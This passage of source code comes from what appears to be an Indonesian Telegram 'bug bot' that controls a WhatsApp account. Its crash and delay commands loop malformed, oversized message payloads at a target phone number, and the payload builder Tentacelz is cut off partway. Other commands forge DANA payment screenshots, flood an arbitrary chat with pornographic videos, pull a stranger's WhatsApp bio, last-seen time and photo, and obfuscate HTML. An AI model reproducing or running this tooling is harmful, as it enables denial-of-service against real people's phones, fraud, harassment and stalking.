    const res = await axios.get(url, {
      responseType: "arraybuffer"
    });

    await ctx.replyWithPhoto(
      { source: Buffer.from(res.data) },
      {
        caption: `💰 Fake Dana\n\nNominal: Rp${formatted}`
      }
    );

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error saat membuat fake Dana");
  }
});

bot.command("getcode", checkOwnerOrAdmin, async (ctx) => {
  const senderId = ctx.from.id;
  const url = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!url)
    return ctx.reply("❌ Format :: /getcode https://namaweb");
  if (!/^https?:\/\//i.test(url))
    return ctx.reply("❌ URL tidak valid.");

  try {
    const response = await axios.get(url, {
      responseType: "text",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; Bot/1.0)" },
      timeout: 20000,
    });

    const htmlContent = response.data;
    const filePath = path.join(__dirname, "web_source.html");
    fs.writeFileSync(filePath, htmlContent, "utf-8");

    await ctx.replyWithDocument({ source: filePath }, {
      caption: `✅ Get Code By Xevorz Catalyze ( 🍁 )\nURL : ${url}`,
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Error: " + err.message);
  }
});

const PROTECTED_IDS = new Set([
  "1082014738",
  "222222222",
]);

const videoList = [
  "https://files.catbox.moe/kusho1.jpg",
  "https://files.catbox.moe/85mjwm.mp4",
  "https://files.catbox.moe/fzzhjm.jpg",
  "https://files.catbox.moe/ec28m8.mp4",
  "https://files.catbox.moe/n3ebuz.mp4",
  "https://files.catbox.moe/qhr4fl.jpg",
  "https://files.catbox.moe/zqaszb.mp4",
  "https://files.catbox.moe/34aa39.mp4",
  "https://files.catbox.moe/dmbizk.mp4",
  "https://files.catbox.moe/wmda7z.mp4",
  "https://files.catbox.moe/kwb2m2.jpg",
  "https://files.catbox.moe/8xye1k.jpg",
  "https://files.catbox.moe/y1osro.mp4",
  "https://files.catbox.moe/2mowo7.jpg",
  "https://files.catbox.moe/o1ipxw.mp4",
  "https://files.catbox.moe/i6335n.mp4",
  "https://files.catbox.moe/73rjgf.jpg",
  "https://files.catbox.moe/3re1pn.jpg",
  "https://files.catbox.moe/sclrvo.jpg",
  "https://files.catbox.moe/l3sra9.jpg",
  "https://files.catbox.moe/vxe9zl.mp4",
  "https://files.catbox.moe/9vtw1i.jpg",
  "https://files.catbox.moe/o1sq2k.mp4",
  "https://files.catbox.moe/y91pkz.jpg",
  "https://files.catbox.moe/0hies4.jpg",
  "https://files.catbox.moe/hnbks1.jpg",
  "https://files.catbox.moe/1a78ht.mp4",
  "https://files.catbox.moe/htcdyl.jpg",
  "https://files.catbox.moe/iajl3r.mp4",
  "https://files.catbox.moe/pamcr7.jpg",
  "https://files.catbox.moe/eti8qi.mp4",
  "https://files.catbox.moe/wgj8vl.mp4",
  "https://files.catbox.moe/83fd5h.mp4",
  "https://files.catbox.moe/k1w8sw.jpg",
  "https://files.catbox.moe/tdqof8.jpg",
  "https://files.catbox.moe/6di4hn.mp4",
  "https://files.catbox.moe/0eisok.mp4",
  "https://files.catbox.moe/e5zkcl.jpg",
];

bot.command("sendbokep", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);

  const targetId = args[0];
  const jumlah = parseInt(args[1]) || 1;

  if (!targetId) {
    return ctx.reply("❌ Format: /sendbokep <chat_id> [jumlah]");
  }

  if (PROTECTED_IDS.has(String(targetId))) {
    return ctx.replyWithHTML(
      `⛔ Pengiriman diblokir: ID <code>${targetId}</code> termasuk dalam daftar terlindungi (developer).`
    );
  }

  await ctx.replyWithHTML(
    ` Mengirim ${jumlah} video ke ID: <code>${targetId}</code>`
  );

  for (let i = 0; i < jumlah; i++) {
    const randomVideo =
      videoList[Math.floor(Math.random() * videoList.length)];

    try {
      await ctx.telegram.sendVideo(targetId, randomVideo);
    } catch (err) {
      console.error("Gagal kirim video:", err.message);

      return ctx.replyWithHTML(
        `❌ Gagal mengirim video ke ID <code>${targetId}</code>: ${err.message}`
      );
    }
  }

  await ctx.replyWithHTML(
    `✅ Berhasil mengirim ${jumlah} video ke ID: <code>${targetId}</code>`
  );
});


bot.command("enchtml", async (ctx) => {
  if (!ctx.message.reply_to_message?.document) {
    return ctx.reply("❌ Please reply to a .html file you want to encrypt");
  }

  try {
    const fileId = ctx.message.reply_to_message.document.file_id;
    const fileInfo = await ctx.telegram.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${TOKEN_BOT}/${fileInfo.file_path}`;

    const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
    const htmlContent = Buffer.from(response.data).toString("utf8");

    const encoded = Buffer.from(htmlContent, "utf8").toString("base64");
    const encryptedHTML = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<title>Xzell. Xopz</title>
<script>
(function(){
  try { document.write(atob("${encoded}")); }
  catch(e){ console.error(e); }
})();
</script>
</head>
<body></body>
</html>`;

    const outputPath = path.join(__dirname, "encbyxzell.html");
    fs.writeFileSync(outputPath, encryptedHTML, "utf-8");

    await ctx.replyWithDocument({ source: outputPath }, {
      caption: "✅ Enc Html By Xevorz Catalyze ( 🍁 )",
    });

    fs.unlinkSync(outputPath);
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Error saat membuat file terenkripsi.");
  }
});

bot.command("cekbio", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("👀 ☇ Format: /cekbio 62×××");
    }

    const q = args[1];
    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    const processMsg = await ctx.replyWithPhoto(thumbnailUrl, {
        caption: `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: Checking...
⌑ Type: WhatsApp Bio Check`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [
                [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
            ]
        }
    });

    try {
 
        const contact = await sock.onWhatsApp(target);
        
        if (!contact || contact.length === 0) {
            await ctx.telegram.editMessageCaption(
                ctx.chat.id,
                processMsg.message_id,
                undefined,
                `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: ❌ Not Found
⌑ Message: Nomor tidak terdaftar di WhatsApp`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
                        ]
                    }
                }
            );
            return;
        }
 
        const contactDetails = await sock.fetchStatus(target).catch(() => null);
        const profilePicture = await sock.profilePictureUrl(target, 'image').catch(() => null);
        
        const bio = contactDetails?.status || "Tidak ada bio";
        const lastSeen = contactDetails?.lastSeen ? 
            moment(contactDetails.lastSeen).tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss') : 
            "Tidak tersedia";

        const caption = `
<blockquote><b>⬡═―—⊱ ⎧ BIO INFORMATION ⎭ ⊰―—═⬡</b></blockquote>
📱 <b>Nomor:</b> ${q}
👤 <b>Status WhatsApp:</b> ✅ Terdaftar
📝 <b>Bio:</b> ${bio}
👀 <b>Terakhir Dilihat:</b> ${lastSeen}
${profilePicture ? '🖼 <b>Profile Picture:</b> ✅ Tersedia' : '🖼 <b>Profile Picture:</b> ❌ Tidak tersedia'}

🕐 <i>Diperiksa pada: ${moment().tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss')}</i>`;

        // Jika ada profile picture, kirim bersama foto profil
        if (profilePicture) {
            await ctx.replyWithPhoto(profilePicture, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}` }]
                       
                    ]
                }
            });
        } else {
            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}` }]
                      
                    ]
                }
            });
        }

 
        await ctx.deleteMessage(processMsg.message_id);

    } catch (error) {
        console.error("Error checking bio:", error);
        
        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsg.message_id,
            undefined,
            `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: ❌ Error
⌑ Message: Gagal mengambil data bio`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
                    ]
                }
            }
        );
    }
});

bot.command("iqc", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /iqc 18:00|40|Indosat|phoenix",
      { parse_mode: "Markdown" }
    );
  }


  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Done Masseh By  Archery Magic ( 🐦‍🔥 )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});

bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("❌  Format: /testfunction 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<blockquote><b>⚘. 𝗔𝗥𝗖𝗛𝗘𝗥𝗬 - 𝗠𝗔𝗚𝗜𝗖「 ཀ 」</b></blockquote>
⬡ ターゲット : ${q}
⬡ タイプ バグ : Uknown Function 
⬡ バグステータス : Proccesing`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "[ 📞 ] Check ϟ Target", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote><b>⚘. 𝗔𝗥𝗖𝗛𝗘𝗥𝗬 - 𝗠𝗔𝗚𝗜𝗖「 ཀ 」</b></blockquote>
⬡ ターゲット : ${q}
⬡ タイプ バグ : Uknown Function 
⬡ バグステータス : Succes`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "[ 📞 ] Check ϟ Target", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "[ 📞 ] Check ϟ Target", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {
    console.log(err)
    }
  }
)


// ~ Access ~ \\
bot.command("setcooldown", checkOwnerOrAdmin, async (ctx) => {

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("❌ Format: /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("addadmin", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format: /addadmin ID"
    );
  }

  const userId = args[1];
  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ User ${userId} already become admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Succes add ${userId} to admin`);
});

bot.command("addprem", checkOwnerOrAdmin, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format: /addprem ID"
    );
  }

  const userId = args[1];
  if (premiumUsers.includes(userId)) {
    return ctx.reply(
      `✅ User ${userId} already become premium.`
    );
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(
    `✅ Succes add ${userId} to premium`
  );
});

bot.command("deladmin", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return ctx.reply(
      "❌ Format: /deladmin ID"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`User ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Succes delete user ${userId} from admin.`);
});

bot.command("delprem", checkOwnerOrAdmin, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format: /delprem ID"
    );
  }

  const userId = args[1];
  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`User ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Succes delete user ${userId} from premium.`);
});



// ~ Cek Premium ~ \\
bot.command("cekprem", async (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (premiumUsers.includes(userId)) {
    return ctx.reply(`Premium Acces`);
  } else {
    return ctx.reply(`Pler Ga Premium`);
  }
});

// ~ Case Pairing ~ \\
bot.command("connect", checkOwner, async (ctx) => {
  const date = getCurrentDate();
  const args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return await ctx.reply(
      "❌ Format: /connect 62xx"
    );
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  try {
    const code = await sock.requestPairingCode(phoneNumber, "PINNBJIR");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.replyWithPhoto(thumbnailurl, {
      caption: `
<blockquote><b>⚘. 𝗔𝗥𝗖𝗛𝗘𝗥𝗬 - 𝗠𝗔𝗚𝗜𝗖「 ཀ 」</b></blockquote>  
⬡ ターゲット : ${phoneNumber}  
⬡ コードペアリング : ${formattedCode}  
⬡ デイデイト : ${date}
`,

   parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "❌ Close", callback_data: "close" }]],
      },
    });
  } catch (error) {
  
 console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply(
      "❌ Gagal melakukan pairing !"
    );
  }
});

// ~ Delete Sessions ~ \\
bot.command("delsessions", async (ctx) => {
  const success = deleteSession();

  if (success) {
    ctx.reply("Succes Delete Sessions");
  } else {
    ctx.reply("Tidak ada session yang tersimpan saat ini.");
  }
});
// ~ Close Pairing ~ \\
bot.action("close", async (ctx) => {
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error(chalk.red("Gagal menghapus pesan:"), error);
  }
});

// ~ Function Sleep ( Untuk Jeda Saat Kirim Bug ) ~ \\
function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// ~ Case Bug ~ \\
bot.command("XcomboARC", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;

    if (!q) {
        return ctx.reply(`Example:\n\n/XcomboARC 628xxxx`);
    }

    let sockNumber = q.replace(/[^0-9]/g, '');

    let target = sockNumber + "@s.whatsapp.net";

    let Prosessock = await ctx.reply(`SUCCES SENDING COMBOTION TO TARGET✅`);
    
   for (let x = 0; x < 25; x++) {
    await Tentacelz(sock, target);
    await xclowerz(sock, target);
 await new Promise(res => setTimeout(res, 5000));
}
   
      
    await ctx.telegram.editMessageText(
        ctx.chat.id,
        Prosessock.message_id,
        undefined, `
DONE SEND TO TARGET👻`);
   await donerespone(target, ctx);
});
// ~ Case Bug 2 ~ \\
bot.command("XcrashARC", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;

    if (!q) {
        return ctx.reply(`Example:\n\n/XcrashARC 628xxxx`);
    }

    let sockNumber = q.replace(/[^0-9]/g, '');

    let target = sockNumber + "@s.whatsapp.net";

    let Prosessock = await ctx.reply(`SUCCES SENDING CRASH TO TARGET✅`);
    
   for (let x = 0; x < 1; x++) {
    await Tentacelz(sock, target);
    await xclowerz(sock, target);
    await DelayKonodex(sock, target);
 await new Promise(res => setTimeout(res, 5000));
}
   
      
    await ctx.telegram.editMessageText(
        ctx.chat.id,
        Prosessock.message_id,
        undefined, `
DONE SEND TO TARGET👻`);
   await donerespone(target, ctx);
});
// ~ Case Bug 3 ~ \\
bot.command("XspamARC", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
    const chatId = ctx.chat.id;
    const date = getCurrentDate();
  
    if (!q) {
      return ctx.reply(`❌ Format : /XspamARC 62xx`);
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // Kirim pesan proses dimulai dan simpan messageId-nya
    const sentMessage = await ctx.sendPhoto("https://files.catbox.moe/3lqzoj.jpg",
      {
        caption: `
<blockquote><b>⚘. 𝗔𝗥𝗖𝗛𝗘𝗥𝗬 - 𝗠𝗔𝗚𝗜𝗖「 ཀ 」</b></blockquote>

⬡ ターゲット : ${q}
⬡ タイプ バグ : XspamARC 100%
⬡ バグステータス : Process
⬡ デイデイト  : ${date}

<blockquote><code>© pinn. 𖣂 .Xopz</code></blockquote>
`,
        parse_mode: "HTML",
      }
    );

    
    console.log(chalk.white(`Process Sending Bugs To ${target}`));

    for (let i = 0; i < 1; i++) {
      await Tentacelz(sock, target);
      await sleep(100)
      console.log(chalk.magenta(`Succes Sending Bugs To ${target}`));
    }

    await ctx.editMessageCaption(
      `
<blockquote><b>⚘. 𝗔𝗥𝗖𝗛𝗘𝗥𝗬 - 𝗠𝗔𝗚𝗜𝗖「 ཀ 」</b></blockquote>

⬡ ターゲット : ${q}
⬡ タイプ バグ : XspamARC 30%
⬡ バグステータス : Succes Sending Bugs
⬡ デイデイト  : ${date}

<blockquote><code>© pinn. 𖣂 .Xopz</code></blockquote>
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "[ 📞 ] Check ϟ Target", url: `https://wa.me/${q}` }],
          ],
        },
      }
    );
  }
);
// ^ Case Bug 4 ` \\
bot.command("XdelayARC", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
    const chatId = ctx.chat.id;
    const date = getCurrentDate();
  
    if (!q) {
      return ctx.reply(`❌ Format : /XdelayARC 62xx`);
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // Kirim pesan proses dimulai dan simpan messageId-nya
    const sentMessage = await ctx.sendPhoto("https://files.catbox.moe/3lqzoj.jpg",
      {
        caption: `
<blockquote><b>⚘. 𝗔𝗥𝗖𝗛𝗘𝗥𝗬 - 𝗠𝗔𝗚𝗜𝗖「 ཀ 」</b></blockquote>

⬡ ターゲット : ${q}
⬡ タイプ バグ : XdelayARC 70%
⬡ バグステータス : Process
⬡ デイデイト  : ${date}

<blockquote><code>© pinn. 𖣂 .Xopz</code></blockquote>
`,
        parse_mode: "HTML",
      }
    );

    
    console.log(chalk.white(`Process Sending Bugs To ${target}`));

    for (let i = 0; i < 35; i++) {
      await DelayKonodex(sock, target);
      await sleep(300)
      console.log(chalk.magenta(`Succes Sending Bugs To ${target}`));
    }

    await ctx.editMessageCaption(
      `
<blockquote><b>⚘. 𝗔𝗥𝗖𝗛𝗘𝗥𝗬 - 𝗠𝗔𝗚𝗜𝗖「 ཀ 」</b></blockquote>

⬡ ターゲット : ${q}
⬡ タイプ バグ : XdelayARC 70%  
⬡ バグステータス : Succes Sending Bugs
⬡ デイデイト  : ${date}

<blockquote><code>© pinn. 𖣂 .Xopz</code></blockquote>
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "[ 📞 ] Check ϟ Target", url: `https://wa.me/${q}` }],
          ],
        },
      }
    );
  }
);
// ` Case Bug 5 ` \\
bot.command("XspecterARC", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
    const chatId = ctx.chat.id;
    const date = getCurrentDate();
  
    if (!q) {
      return ctx.reply(`❌ Format : /XspecterARC 62xx`);
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // Kirim pesan proses dimulai dan simpan messageId-nya
    const sentMessage = await ctx.sendPhoto("https://files.catbox.moe/3lqzoj.jpg",
      {
        caption: `
<blockquote><b>⚘. 𝗔𝗥𝗖𝗛𝗘𝗥𝗬 - 𝗠𝗔𝗚𝗜𝗖「 ཀ 」</b></blockquote>

⬡ ターゲット : ${q}
⬡ タイプ バグ : XspecterARC 30%
⬡ バグステータス : Process
⬡ デイデイト  : ${date}

<blockquote><code>© pinn. 𖣂 .Xopz</code></blockquote>
`,
        parse_mode: "HTML",
      }
    );

    
    console.log(chalk.white(`Process Sending Bugs To ${target}`));

    for (let i = 0; i < 20; i++) {
      await CStatus(sock, target);
      await sleep(100)
      console.log(chalk.magenta(`Succes Sending Bugs To ${target}`));
    }

    await ctx.editMessageCaption(
      `
<blockquote><b>⚘. 𝗔𝗥𝗖𝗛𝗘𝗥𝗬 - 𝗠𝗔𝗚𝗜𝗖「 ཀ 」</b></blockquote>

⬡ ターゲット : ${q}
⬡ タイプ バグ : XspecterARC 30% 
⬡ バグステータス : Succes Sending Bugs
⬡ デイデイト  : ${date}

<blockquote><code>© pinn. 𖣂 .Xopz</code></blockquote>
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "[ 📞 ] Check ϟ Target", url: `https://wa.me/${q}` }],
          ],
        },
      }
    );
  }
);
// ~ Case Bug 6 ~ \\
bot.command("XcroserdARC", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
    const chatId = ctx.chat.id;
    const date = getCurrentDate();
                 
    if (!q) {
      return ctx.reply(`❌ Format : /XcroserdARC 62xx`);
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const sentMessage = await ctx.sendPhoto("https://files.catbox.moe/3lqzoj.jpg",
      {
        caption: `
<blockquote><b>⚘. 𝗔𝗥𝗖𝗛𝗘𝗥𝗬 - 𝗠𝗔𝗚𝗜𝗖「 ཀ 」</b></blockquote>

⬡ ターゲット : ${q}
⬡ タイプ バグ : Croserd 
⬡ バグステータス : Proccesing
⬡ デイデイト  : ${date}

<blockquote><code>© pinn. 𖣂 .Xopz</code></blockquote>
`,
        parse_mode: "HTML",
      }
    );

    
    console.log(chalk.white(`Process Sending Bugs To ${target}`));
    for (let i = 0; i < 50; i++) {
      await xclowerz(sock, target);
      await sleep(500)
    }

    await ctx.editMessageCaption(
      `
<blockquote><b>⚘. 𝗔𝗥𝗖𝗛𝗘𝗥𝗬 - 𝗠𝗔𝗚𝗜𝗖「 ཀ 」</b></blockquote>

⬡ ターゲット : ${q}
⬡ タイプ バグ : Croserd Andro
⬡ バグステータス : Succes Sending Bugs
⬡ デイデイト  : ${date}

<blockquote><code>© pinn. 𖣂 .Xopz</code></blockquote>
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "[ 📞 ] Check ϟ Target", url: `https://wa.me/${q}` }],
          ],
        },
      }
    );
  }
);
// ~ Case Bug 7 ~ \\
bot.command("XghostARC", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;

    if (!q) {
        return ctx.reply(`Example:\n\n/XghostARC 628xxxx`);
    }

    let sockNumber = q.replace(/[^0-9]/g, '');

    let target = sockNumber + "@s.whatsapp.net";

    let Prosessock = await ctx.reply(`SUCCES SENDING TO DELAY BEBAS SPAM ARCHERY`);
    
   for (let x = 0; x < 5; x++) {
    await Nukleotix(sock, target);
 await new Promise(res => setTimeout(res, 500));
}
   
      
    await ctx.telegram.editMessageText(
        ctx.chat.id,
        Prosessock.message_id,
        undefined, `
┏━━━━━━━━━━━━━━━━━━━━━━━❍
┃『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
┃
┃𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
┃𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆✅
┗━━━━━━━━━━━━━━━━━━━━━━━❍`);
   await donerespone(target, ctx);
});
// ~ Function Bugs ~ \\
async function Tentacelz(sock, target) {
for (let i = 0; i < 1000; i++) {
const push = [];
const buttons = [];

for (let j = 0; j < 1000; j++) {  
        buttons.push({  
            name: 'galaxy_message',  
            buttonParamsJson: JSON.stringify({  
                header: 'null',  
                body: 'xxx',  
                flow_action: 'navigate',  
                flow_action_payload: {  
                    screen: 'FORM_SCREEN'  
                },  
                flow_cta: 'Grattler',  
                flow_id: '1169834181134583',  
                flow_message_version: '3',  
                flow_token: 'AQAAAAACS5FpgQ_cAAAAAE0QI3s',  
            }),  
        });  
    }  
      
    for (let k = 0; k < 1000; k++) {  
        push.push({  
            body: {  
                text: 'X᳟᪳'  
            },  
            footer: {  
                text: ''  
            },  
            header: {  
                title: 'X ',  
                hasMediaAttachment: true,  
                imageMessage: {  
                    url: 'https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true',  
                    mimetype: 'image/jpeg',  
                    fileSha256: 'dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=',  
                    fileLength: '591',  
                    height: 0,  
                    width: 0,  
                    mediaKey: 'LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=',  
                    fileEncSha256: 'G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=',  
                    directPath: '/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0',  
                    mediaKeyTimestamp: '1721344123',  
                    jpegThumbnail: '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z',  
                    scansSidecar: 'igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==',  
                    scanLengths: [247, 201, 73, 63],  
